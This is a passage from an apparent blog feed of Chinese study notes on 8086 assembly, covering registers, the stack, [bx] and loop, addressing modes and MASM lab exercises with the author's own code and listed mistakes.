class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="改进后-写成了一个循环"><a href="#改进后-写成了一个循环" class="headerlink" title="改进后,写成了一个循环"></a>改进后,写成了一个循环</h5><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesg,ds:datasgdatasg segment    db 'welcome to masm!'    db 02H,24H,71Hdatasg endscodesg segmentstart:    mov ax,datasg    mov ds,ax    mov ax,0B800H    mov es,ax;1        mov bx,6E0H    mov cx,3    mov bp,0all:    push cx    mov si,0    mov di,80    mov cx,16    s:          mov al,ds:[si]        mov es:[bx+di],al        mov al,ds:[bp+16]        mov es:[bx+di+1],al        add di,2        add si,1        loop s    add bp,1    add bx,160    pop cx    loop all; ;2;     mov bx,780H;     mov si,0;     mov di,80;     mov cx,16; s1:  ;     mov al,ds:[si];     mov es:[bx+di],al;     mov byte ptr es:[bx+di+1],24H;     add di,2;     add si,1;     loop s1; ;3;     mov bx,820H;     mov si,0;     mov di,80;     mov cx,16; s2:  ;     mov al,ds:[si];     mov es:[bx+di],al;     mov byte ptr es:[bx+di+1],71H;     add di,2;     add si,1;     loop s2    mov ax,4c00h    int 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行截图-1"><a href="#运行截图-1" class="headerlink" title="运行截图"></a>运行截图</h4><p>这个运行结果，怎么有的时候行有的时候不行？之前运行的时候，第一行的welcome 显示成了 celcome或是1/4elcome很奇怪。但是后面就又正常了<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013201157.png" alt="实验九"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211013205518.png" alt="改正后"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-更灵活的定位内存地址的方法</title>
      <link href="/2021/10/11/hui-bian-yu-yan-xue-xi-geng-ling-huo-de-ding-wei-nei-cun-di-zhi-de-fang-fa/"/>
      <url>/2021/10/11/hui-bian-yu-yan-xue-xi-geng-ling-huo-de-ding-wei-nei-cun-di-zhi-de-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="编程1-将datasg段中每个单词的前四个字母改为大写字母"><a href="#编程1-将datasg段中每个单词的前四个字母改为大写字母" class="headerlink" title="编程1 将datasg段中每个单词的前四个字母改为大写字母"></a>编程1 将datasg段中每个单词的前四个字母改为大写字母</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesg,ss:stacksg,ds:datasgstacksg segment    dw 0,0,0,0,0,0,0,0stacksg endsdatasg segment    db '1. display      '    db '2. brows        '    db '3. replace      '    db '4. modify       'datasg endscodesg segmentstart:    mov ax,stacksg    mov ss,ax    mov sp,16;初始化栈段        mov ax,datasg    mov ds,ax;初始化数据段        mov bx,0    mov cx,4s:    push cx    mov cx,4    mov si,0s0:    mov al,ds:[bx+3+si];这个地方必须要是 bx+(si/di)+(idata)这样的形式,()为可选内容    and al,11011111B;01100100 01000100--44      mov ds:[bx+3+si],al    inc si    loop s0    pop cx    add bx,16    loop s        mov ax,4c00h    int 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211011200251.png" alt="运行截图"></p><h3 id="出现的错误"><a href="#出现的错误" class="headerlink" title="出现的错误"></a>出现的错误</h3><ul><li><code>and al,11011111b</code>少打了一个1</li></ul><h2 id="编程2-将datasg中的第一个字符串转换成大写-第二个字符串转成小写"><a href="#编程2-将datasg中的第一个字符串转换成大写-第二个字符串转成小写" class="headerlink" title="编程2 将datasg中的第一个字符串转换成大写,第二个字符串转成小写"></a>编程2 将datasg中的第一个字符串转换成大写,第二个字符串转成小写</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesg,ds:datasgdatasg segment    db 'BaSiC'    db 'iNfOrMaTiOn'datasg endscodesg segment    start:        mov ax,datasg        mov ds,ax                mov bx,1        mov cx,2    s:        mov al,ds:[bx]        and al,11011111b        mov ds:[bx],al        add bx,2        loop s                mov bx,6;这个bx要定位到 第二个字符串的第一个大写字母啊        mov cx,5    s0:        mov al,ds:[bx]        or al,00100000b        mov ds:[bx],al                add bx,2        loop s0        mov ax,4c00h        int 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211011203022.png" alt="运行截图"></p><h3 id="出现的错误-1"><a href="#出现的错误-1" class="headerlink" title="出现的错误"></a>出现的错误</h3><ul><li>第二个字符串定位是要在<code>第一个大写字母N</code></li></ul><h2 id="编程3-用si和di实现将字母串”welcome-to-masm-”复制到它后面的数据区中"><a href="#编程3-用si和di实现将字母串”welcome-to-masm-”复制到它后面的数据区中" class="headerlink" title="编程3 用si和di实现将字母串”welcome to masm!”复制到它后面的数据区中"></a>编程3 用si和di实现将字母串”welcome to masm!”复制到它后面的数据区中</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume  cs:codesg,ds:datasgdatasg segment    db 'welcome to masm!'    db '................'datasg endscodesg segmentstart:    mov ax,datasg    mov ds,ax    mov si,0    mov di,10h    mov bx,0    mov cx,8 s:     mov ax,ds:[bx+si]    mov ds:[bx+di],ax        add si,2    add di,2        loop s    mov ax,4c00h    int 21hcodesg endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211011204256.png" alt="运行截图"></p><h3 id="出现的错误-2"><a href="#出现的错误-2" class="headerlink" title="出现的错误"></a>出现的错误</h3><ul><li><code>assume codesg</code> 和<code>code segment</code> 不匹配</li><li>di寄存器写成bi</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一章中,我们主要讲解了更为灵活的寻址方式的应用和一些编程方法,主要的内容有：</p><ul><li>寻址方式 [bx]–编程2[bx+idata] [bx+si]–编程3[bx+si+idata]–编程1</li><li>二重循环问题的处理,处理两个循环loop都使用cx寄存器的时候,会出现冲突的问题.解决的最佳方式就是将cx的值暂时存储到栈空间中,等到再次回到外层循环的时候,再将其出栈,以此实现将互不影响.这里也能体现处在<code>调用函数</code>掉用<code>被调用函数</code>的时候,将各个寄存器的值入栈,等到<code>被调用函数</code>返回时,再将各个寄存器的值初始化到调用<code>被调用函数</code>之前,这样就可以继续执行<code>调用函数</code>,而不产生影响.</li><li>栈的应用</li><li>大小写转换的方法<br>小写转大写 <code>and al,11011111b</code><br>大写转小写 <code>or al,00100000b</code></li><li>and | or 指令</li></ul>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-[bx]和loop指令</title>
      <link href="/2021/10/10/hui-bian-yu-yan-xue-xi-bx-he-loop-zhi-ling/"/>
      <url>/2021/10/10/hui-bian-yu-yan-xue-xi-bx-he-loop-zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="bx"><a href="#bx" class="headerlink" title="[bx]"></a>[bx]</h2><p><code>mov ax,[bx]</code>, bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中,将SA:EA处的数据送入ax中,<strong>注意这里是字型数据哦！</strong> 即:<code>ax = ds*16 + bx</code></p><p>建议以后再写汇编语言程序的时候,把[bx]前面的段寄存器显式地标注出来,也就是所谓的<strong>段前缀</strong>。</p><h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>loop 指令就是一个循环指令，注意cx循环次数,和bx在循环过程中的变化。</p><h2 id="综合应用"><a href="#综合应用" class="headerlink" title="综合应用"></a>综合应用</h2><p>计算ffff:0-ffff:b单元中的数据的和,结果存储在dx中</p><h3 id="数据相加的问题"><a href="#数据相加的问题" class="headerlink" title="数据相加的问题"></a>数据相加的问题</h3><ul><li>dx = dx + 内存中的8位数据 类型不匹配</li><li>dl = dl + 内存中的8位数据 结果越界</li></ul><p>解决方案：利用一个16位的寄存器来做中介。将内存单元中的8位数据赋值到一个16位寄存器ax中<strong>高八位要初始化为0</strong>,再将ax中的数据加到dx上,从而使两个运算对象的类型匹配并且结果不会超界。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="1-and-2"><a href="#1-and-2" class="headerlink" title="1 and 2"></a>1 and 2</h3><p>编程 ,向内存 0:200<del>0:23F依次传送数据0</del>63</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesegcodeseg segmentstart: mov ax,0200H    ;这里第一次写成0H了 心里想的确实是0200 不知道怎么弄成0了      mov ds,ax          mov bx,0H      mov cx,40H    s:  mov ds:[bx],bl    inc bx    loop s        mov ax,4c00H    int 21hcodeseg endsend startend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>将”mov ax,4c00h”之前的指令复制到内存0:200h处,补全程序,上机调试,跟踪运行结果.</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesegcodeseg segmentstart: mov ax,cs    mov ds,ax    mov ax,0020h    mov es,ax    mov bx,0    mov cx,17h;第一次写的21(10进制),看网上有说18的，感觉不对呀，我17的话就刚刚好是可以复制完的    ;还有view里面cpu指令前面的地址是该指令的起始地址 你还要加上这个指令的大小,才算是下一条指令的相对地址,而且别忽略了最初的地址是从零开始算的s:  mov al,ds:[bx];标签表示的是相对于段定义起始位置的位置    mov es:[bx],al    inc bx    loop s    mov ax,4c00h    int 21hcodeseg endsend startend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211010160654.png" alt="运行结果"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-包含多个段的程序</title>
      <link href="/2021/10/10/hui-bian-yu-yan-xue-xi-bao-han-duo-ge-duan-de-cheng-xu/"/>
      <url>/2021/10/10/hui-bian-yu-yan-xue-xi-bao-han-duo-ge-duan-de-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h1><p>代码结构</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codecode segment      ··      ··      数据      ··      ··start:      ··      ··      代码      ··      ··code endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="在代码段中使用栈"><a href="#在代码段中使用栈" class="headerlink" title="在代码段中使用栈"></a>在代码段中使用栈</h1><p>代码结构跟上面的差不多,就是要在start中初始化段指针(SS\SP)</p><h1 id="将数据、代码、栈放入不同的段"><a href="#将数据、代码、栈放入不同的段" class="headerlink" title="将数据、代码、栈放入不同的段"></a>将数据、代码、栈放入不同的段</h1><h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:code, ds:data, ss:stackdata segment    ··data endsstack segment    ··stack endscode segmentstart:      ··      ··      代码      ··      ··code endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构是这个结构,但是在代码段中,仍然需要使用初始化指令来将相应的ds\ss\sp寄存器初始化才可以。总而言之，cpu到底如何处理我们定义的段的中的内容,是当作指令执行，还是当作数据访问，还是当作栈空间,完全是靠程序中具体的汇编指令,和汇编指令对cs:ip、ss:sp、ds等寄存器的设置来决定的。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>前面几个都是给出程序来调试观察的。就不列举出来了</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>编写code总的代码段,将a段和b段中的数据依次相加,将结果保存在c段中。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codea segment    db 1,2,3,4,5,6,7,8a endsb segment    db 1,2,3,4,5,6,7,8b endsc segment    db 0,0,0,0,0,0,0,0c ends;把a 、b段中的数据相加，结果存储到c段当中code segmentstart: mov ax,a    mov ds,ax        mov ax,b    mov es,ax  mov ax,c  mov ss,ax  mov sp,8        mov bx,0    mov cx,7 ;方法1; 这样的话解决不了最后08+08的情况, 栈顶指针刚好是0001-> FFFF 这样10放高地址就恰好被溢出了。; 所以我觉得,还有一种方式是最后一个元素，用al，其他的用ah, 按照栈元素来说，这样做的是对的; 代做: 这样做很麻烦倒是,更好的方式应该是分别计算两个字节的，然后组成一个字，同时push进去，这样的话就不用处理最后一个栈顶元素的问题了; 方法1-------是个错误的方法，解决不了栈顶最初始的元素s: mov ah,ds:[bx]  add ah,es:[bx]  push ax  add sp,1;    mov c:[bx],al  inc bx  loop s;处理最后一个元素    mov al,ds:[bx]    add al,es:[bx]    push ax;方法二------推荐--正确    ; mov cx,4 ;方法2; s: mov ah,ds:[bx];    add ah,es:[bx];    add bx,1   ;    mov al,ds:[bx];    add al,es:[bx];    add bx,1;    push ax;    loop s    mov ax,4c00h    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>编写code中的代码,用push指令将a段中的前八个字型数据,逆序存储到b段中。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codea segment    dw 1,2,3,4,5,6,7,8,9,0ah,0bh,0ch,0dh,0eh,0fh,0ffha endsb segment    dw 0,0,0,0,0,0,0,0b endscode segmentstart: mov ax,b    mov ss,ax    mov sp,10h;8个字型数据,栈顶指针的大小应该是10h哦！        mov ax,a    mov es,ax        mov bx,0    mov cx,8s: push es:[bx]    add bx,2;bx这里要自增2哦！    loop s    mov ax,4c00h    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-第一个程序-1</title>
      <link href="/2021/10/06/hui-bian-yu-yan-xue-xi-di-yi-ge-cheng-xu-1/"/>
      <url>/2021/10/06/hui-bian-yu-yan-xue-xi-di-yi-ge-cheng-xu-1/</url>
      
        <content type="html"><![CDATA[<h1 id="关于汇编程序的执行问题"><a href="#关于汇编程序的执行问题" class="headerlink" title="关于汇编程序的执行问题"></a>关于汇编程序的执行问题</h1><p>在DOS中,可执行文件中的程序P1若要运行，必须有一个正在运行的程序p2,将p1从可执行文件中加载入内存,将CPU的控制权交给它.p1才能够运行,当p1运行完毕后,应该将cpu的控制权交还给使她得以运行的程序p2</p><h2 id="思考问题"><a href="#思考问题" class="headerlink" title="思考问题"></a>思考问题</h2><ul><li>在提示符<code>C:\masm</code>后面输入可执行文件的名字”1”,按下回车enter键，这时，思考问题4.1</li><li>1.exe运行</li><li>运行结束后，返回。再次显示提示符<code>C:masm</code>.思考问题4.2</li></ul><h3 id="4-1-此时-有一个正在运行的程序将1-exe中的程序加载入内存，这个正在运行的程序是什么？它将程序加载入内存后，如何使程序得以运行？"><a href="#4-1-此时-有一个正在运行的程序将1-exe中的程序加载入内存，这个正在运行的程序是什么？它将程序加载入内存后，如何使程序得以运行？" class="headerlink" title="4.1 此时,有一个正在运行的程序将1.exe中的程序加载入内存，这个正在运行的程序是什么？它将程序加载入内存后，如何使程序得以运行？"></a>4.1 此时,有一个正在运行的程序将1.exe中的程序加载入内存，这个正在运行的程序是什么？它将程序加载入内存后，如何使程序得以运行？</h3><p>操作系统是由多个功能模块组成的庞大、复杂的软件系统。任何通用的操作系统，都要提供一个成为shell的程序，用户使用这个程序来操作计算机系统进行工作。</p><p>DOS中有一个程序command.com，这个程序在DOS中成为命令解释器，也就是DOS系统的shell。</p><p>DOS启动时，先完成其他重要的初始化工作，然后运行command.com，command.com运行后，执行完其他相关的任务后，在屏幕上显示出当前盘符和当前路径组成的提示符，等待用户输入。</p><p>用户可以输入所要执行的命令，如：cd、dir、type等，这些命令由command执行，command执行完这些命令后，再次显示由当前盘符和当前路径组成的提示符，等待用户输入。</p><p>如果用户要执行一个程序，则输入该程序的可执行文件的名称，command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载到内存中，设置CS:IP指向程序的入口。此后command暂时停止运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示出由当前盘符和当前路径组成的提示符，等待用户输入。</p><p>在DOS中，command处理各种输入：命令或要执行的程序的文件名。我们就是用过command来进行工作的。</p><h3 id="4-2-程序运行结束后，返回到了哪里？"><a href="#4-2-程序运行结束后，返回到了哪里？" class="headerlink" title="4.2 程序运行结束后，返回到了哪里？"></a>4.2 程序运行结束后，返回到了哪里？</h3><p>程序运行结束后，返回到了command中。</p><h4 id="汇编程序从写出到执行的过程"><a href="#汇编程序从写出到执行的过程" class="headerlink" title="汇编程序从写出到执行的过程"></a>汇编程序从写出到执行的过程</h4><p>编程 -&gt; 1.asm -&gt; 编译 -&gt; 1.obj -&gt; 链接 -&gt; 1.exe -&gt; 加载 -&gt; 内存中的程序 -&gt; 运行</p><h2 id="观察下面程序执行过程中，寄存器和栈顶元素的变化"><a href="#观察下面程序执行过程中，寄存器和栈顶元素的变化" class="headerlink" title="观察下面程序执行过程中，寄存器和栈顶元素的变化"></a>观察下面程序执行过程中，寄存器和栈顶元素的变化</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesegcodeseg segmentstart:  mov ax,2000H        mov ss,ax        mov sp,0        pop ax        pop bx        push ax        push bx        pop ax        pop bx        mov ax,4c00H    int 21hcodeseg endsend startend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ax bx 各出入栈。IP和SP指针在变化，其余寄存器没看到变化。栈顶元素最后还是变化到跟初始状态下一致了</p><p>PSP的头两个字节时CD20,其中的内容为</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211006115030.png" alt="PSP"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-寄存器-3</title>
      <link href="/2021/10/04/hui-bian-yu-yan-xue-xi-ji-cun-qi-3/"/>
      <url>/2021/10/04/hui-bian-yu-yan-xue-xi-ji-cun-qi-3/</url>
      
        <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="基本指令-1-PUSH"><a href="#基本指令-1-PUSH" class="headerlink" title="基本指令 1 PUSH"></a>基本指令 1 PUSH</h2><p>对于push指令的执行</p><ul><li>SP = SP - 2, SS:SP指向当前栈顶前面的单元,以当前栈顶前面的单元为新的栈顶;</li><li>将ax中的内容送入SS:SP指向的内存单元处,SS:SP此时指向新栈顶</li></ul><p>具体的图就不画了</p><h2 id="基本指令-2-POP"><a href="#基本指令-2-POP" class="headerlink" title="基本指令 2 POP"></a>基本指令 2 POP</h2><p>关于pop指令的执行</p><ul><li>将SS:SP指向的内存单元处的数据送入ax中</li><li>SP = SP + 2, SS:SP 指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</li></ul><p><strong>注意</strong>: 栈里面的单元是以字为单位的(2个字节),字单元的地址是两个字节地址中的低地址</p><h2 id="栈顶的超界问题"><a href="#栈顶的超界问题" class="headerlink" title="栈顶的超界问题"></a>栈顶的超界问题</h2><p>对于8086CPU不保证对栈的操作不会越界。也就是说,8086CPU只知道栈顶在何出(由SS:SP指示),而不知道我们安排的栈空间有多大。这点好像CPU只知道执行的指令在何出(由CS:IP指示),而不知道要执行的指令有多少。从这两点上我们可以看出8086CPU的工作机理,它只<code>考虑当前的情况:当前的栈顶在何处、当前要执行的指令是哪一条</code></p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="寄存器清零"><a href="#寄存器清零" class="headerlink" title="寄存器清零"></a>寄存器清零</h3><p>两种方式:</p><ul><li>sub ax,ax 机器码为2个字节</li><li>mov ax,0 机器码为3个字节</li></ul><h3 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h3><p>一段内存,可以既是代码的存储空间,又是数据的存储空间,还可以是栈空间,也可以什么也不是.关键在于CPU中寄存器的设置，即CS\IP\SS\SP\DS的指向。</p><p>我们可以用一个段来此存放数据,将它定义为 数据段 </p><p>我们可以用一个段来此存放代码,将它定义为 代码段 </p><p>我们可以用一个段来此存放栈,将它定义为 栈段</p><p>对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问。</p><p>对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就能指向我们定义的代码段中的指令。</p><p>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，就将我们定义的栈段当作栈空间来操作。</p><p>比如我们将10000H - 1001FH 安排为代码段，并在里面存储如下代码：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mov ax, 1000Hmov ss, axmov sp, 0020Hmov ax, csmov ds, axmov ax, [0]add ax, [2]mov bx, [4]add bx, [6]push axpush bxpop axpop bx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置CS = 10000H,IP=0。这段代码将得到执行，可以看到，在这段代码中，我们又将10000H - 1001FH 安排为栈段和数据段。10000H - 1001FH 这段内存，既是代码段，又是栈段和数据段。</p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-寄存器-2</title>
      <link href="/2021/10/02/hui-bian-yu-yan-xue-xi-ji-cun-qi-2/"/>
      <url>/2021/10/02/hui-bian-yu-yan-xue-xi-ji-cun-qi-2/</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器-2"><a href="#寄存器-2" class="headerlink" title="寄存器-2"></a>寄存器-2</h1><h2 id="字的存储"><a href="#字的存储" class="headerlink" title="字的存储"></a>字的存储</h2><p>字的存储没什么好说的，注意下低地址就行了</p><h2 id="指令操作单元之间的关系"><a href="#指令操作单元之间的关系" class="headerlink" title="指令操作单元之间的关系"></a>指令操作单元之间的关系</h2><h3 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h3><p>  8086CPU不支持将数据直接送入段寄存器的操作。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211002102608.png" alt="mov指令数据流向"></p><h3 id="sub、add指令"><a href="#sub、add指令" class="headerlink" title="sub、add指令"></a>sub、add指令</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211002102642.png" alt="指令数据流向"></p><h2 id="jmp指令跳转后，cs-code-segment-会发生变化"><a href="#jmp指令跳转后，cs-code-segment-会发生变化" class="headerlink" title="jmp指令跳转后，cs code segment 会发生变化"></a>jmp指令跳转后，cs <code>code segment</code> 会发生变化</h2><p>  初始情况下 CS=2000H，IP=0，DS=1000H, AX=0, BX=0</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">20000H-20002H mov ax,6222H20003H-20007H jmp 0ff0:010020008H-20009H mov bx,ax10000H-10002H mov ax,2000H10003H-10004H mov ds,ax10005H-10007H mov ax,[0008]10008H-1000AH mov ax,[0002]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  想说的就是，在执行完<code>jmp 0ff0:0100</code>时 <code>CS 2000H-&gt;0FF0H</code> , <code>IP 0003H-&gt; 0100H</code>,而且执行到<code>mov ax,[0002]</code>后不会再跳回来</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211002104344.png" alt="汇编执行图"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-寄存器</title>
      <link href="/2021/10/01/hui-bian-yu-yan-xue-xi-ji-cun-qi/"/>
      <url>/2021/10/01/hui-bian-yu-yan-xue-xi-ji-cun-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="第二章-寄存器"><a href="#第二章-寄存器" class="headerlink" title="第二章 寄存器"></a>第二章 寄存器</h2><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><ol><li><p><strong>使用debug指令，将上面的程序段写入内存，逐条执行，观察每条指令执行后，CPU中相关寄存器中的内容变化。</strong></p><p> 输入指令<br> <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211001094702.png" alt="20211001094702"></p><p> 修改cs ip 使用r指令<br> <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211001094920.png" alt="20211001094920"></p><p> 执行程序 使用t指令<br> <code>具体的过程就不截图了，是ax bx ip 三个寄存器之间值的变化</code></p></li><li><p><strong>利用了三条指令计算2的八次方</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mov ax,1add ax,axjmp 2000:0003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也是通过t 命令运行程序并观察寄存器中值的变化。</p></li><li><p><strong>查看内存中的内容</strong><br>查看主板上面的内容，我是没看见。不知道是不是因为使用的是DOSbox的原因<br> <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211001102449.png" alt="20211001102449"></p></li><li><p><strong>向内存从B8100H 